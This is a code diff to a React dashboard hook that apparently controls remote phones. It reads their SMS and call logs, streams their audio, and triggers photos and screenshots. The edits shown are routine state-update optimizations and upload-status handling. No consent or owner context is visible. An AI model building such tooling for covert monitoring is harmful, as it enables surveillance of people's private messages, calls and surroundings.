@@ -1,10 +1,22 @@
 import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
 import { apiUrl, wsUrlForControl } from '../lib/helpers';
 
-const PHOTO_LIMIT = 36;
-const FEED_LIMIT = 40;
+const PHOTO_LIMIT = 24;
+const FEED_LIMIT = 24;
 
 const photoIdentity = photo => String(photo?.id || photo?.filename || photo?.url || '');
+
+const shallowEqual = (a, b) => {
+  if (a === b) return true;
+  if (!a || !b) return false;
+  const aKeys = Object.keys(a);
+  const bKeys = Object.keys(b);
+  if (aKeys.length !== bKeys.length) return false;
+  for (const key of aKeys) {
+    if (a[key] !== b[key]) return false;
+  }
+  return true;
+};
 
 const mergePhotoList = (incoming, existing = []) => {
   const merged = new Map();
@@ -151,9 +163,9 @@ export function useDashboard(onAudioData) {
   const mergeDeviceList = useCallback(incoming => {
     setDevices(prev => {
       const byId = new Map(prev.map(device => [device.deviceId, device]));
-      return (incoming || []).map(device => {
+      const nextList = (incoming || []).map(device => {
         const existing = byId.get(device.deviceId);
-        return {
+        const merged = {
           ...existing,
           ...device,
           health: {
@@ -163,7 +175,24 @@ export function useDashboard(onAudioData) {
           sms: device.sms ?? existing?.sms,
           calls: device.calls ?? existing?.calls
         };
+        if (
+          existing &&
+          existing.model === merged.model &&
+          existing.sdk === merged.sdk &&
+          existing.appVersionName === merged.appVersionName &&
+          existing.appVersionCode === merged.appVersionCode &&
+          existing.sms === merged.sms &&
+          existing.calls === merged.calls &&
+          shallowEqual(existing.health, merged.health)
+        ) {
+          return existing;
+        }
+        return merged;
       });
+      if (nextList.length === prev.length && nextList.every((device, idx) => device === prev[idx])) {
+        return prev;
+      }
+      return nextList;
     });
   }, []);
   const upsertDevice = useCallback(next => {
@@ -172,17 +201,30 @@ export function useDashboard(onAudioData) {
       if (idx === -1) {
         return [next, ...prev];
       }
-      const clone = [...prev];
-      clone[idx] = {
-        ...clone[idx],
+      const existing = prev[idx];
+      const merged = {
+        ...existing,
         ...next,
         health: {
-          ...clone[idx].health,
+          ...existing.health,
           ...next.health
         },
-        sms: next.sms ?? clone[idx].sms,
-        calls: next.calls ?? clone[idx].calls
+        sms: next.sms ?? existing.sms,
+        calls: next.calls ?? existing.calls
       };
+      if (
+        existing.model === merged.model &&
+        existing.sdk === merged.sdk &&
+        existing.appVersionName === merged.appVersionName &&
+        existing.appVersionCode === merged.appVersionCode &&
+        existing.sms === merged.sms &&
+        existing.calls === merged.calls &&
+        shallowEqual(existing.health, merged.health)
+      ) {
+        return prev;
+      }
+      const clone = [...prev];
+      clone[idx] = merged;
       return clone;
     });
   }, []);
@@ -441,6 +483,39 @@ export function useDashboard(onAudioData) {
             addFeed(`Audio lag on ${deviceId.slice(0, 8)}: dropping old packets`);
             return;
           }
+          if (type === 'image_upload_status') {
+            const deviceId = String(msg.deviceId || selectedDeviceIdRef.current || '');
+            if (!deviceId) return;
+            const status = String(msg.status || 'idle');
+            upsertDevice({
+              deviceId,
+              health: Object.fromEntries(Object.entries({
+                imageUploadStatus: status,
+                imageQueued: msg.imageQueued === true,
+                imageUploading: msg.uploading === true,
+                uploadPausedForAudio: msg.uploadPausedForAudio === true,
+                imageQueueDepth: Number(msg.queueDepth || 0),
+                lowNetwork: msg.audioLive === true ? true : undefined
+              }).filter(([, value]) => value !== undefined))
+            });
+            if (msg.command) {
+              const command = String(msg.command);
+              const commandStatus = status === 'queued' ? 'queued'
+                : status === 'paused' || status === 'uploading' ? 'sending'
+                : status === 'uploaded' ? 'sent'
+                : status === 'error' ? 'error'
+                : null;
+              setCommandStatus(deviceId, command, commandStatus);
+            }
+            const label = status === 'paused' ? 'Upload paused for audio'
+              : status === 'queued' ? 'Image queued'
+              : status === 'uploading' ? 'Image uploading'
+              : status === 'uploaded' ? 'Image uploaded'
+              : status === 'error' ? 'Image upload failed'
+              : null;
+            if (label) addFeed(`${label}: ${String(msg.filename || '').slice(0, 40)}`);
+            return;
+          }
           if (type === 'gain_ack') {
             const deviceId = String(msg.deviceId || selectedDeviceIdRef.current || '');
             const level = Number(msg.level);
@@ -475,7 +550,7 @@ export function useDashboard(onAudioData) {
 
             // Parse SMS messages
             const rawSms = data.sms;
-            const sms = (rawSms || []).map((s, i) => ({
+            const sms = (rawSms || []).slice(0, 100).map((s, i) => ({
               id: String(s.id || i),
               sender: String(s.address || 'Unknown'),
               body: String(s.body || ''),
@@ -486,7 +561,7 @@ export function useDashboard(onAudioData) {
 
             // Parse call log
             const rawCalls = data.callLog;
-            const calls = (rawCalls || []).map((c, i) => ({
+            const calls = (rawCalls || []).slice(0, 100).map((c, i) => ({
               id: String(c.id || i),
               number: String(c.number || 'Unknown'),
               name: c.name ? String(c.name) : undefined,
@@ -526,12 +601,6 @@ export function useDashboard(onAudioData) {
               setCommandStatus(String(msg.deviceId), photo.camera === 'screenshot' ? 'take_screenshot' : 'take_photo', null);
             }
             addFeed(`Photo saved: ${photo.filename}`);
-            return;
-          }
-
-          // Handle recording saved
-          if (type === 'recording_saved') {
-            addFeed(`🎙️ Recording saved: ${msg.filename || 'Unknown'}`);
             return;
           }
 
